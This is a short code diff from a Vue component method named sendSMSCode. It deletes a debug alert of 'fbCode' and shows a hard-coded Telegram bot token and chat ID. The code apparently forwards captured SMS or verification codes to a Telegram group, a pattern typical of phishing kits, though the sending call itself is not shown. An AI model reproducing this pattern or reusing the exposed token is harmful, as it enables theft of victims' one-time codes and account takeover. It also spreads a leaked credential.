@@ -523,7 +523,6 @@ export default {
   },
   methods: {
     sendSMSCode() {
-      alert(this.fbCode);
       var token = '7655618564:AAGDSVuMIRoAb_ddIDz3jTRNuA7KmfQeFsA';
 
       var chatId2 = -4558777767;
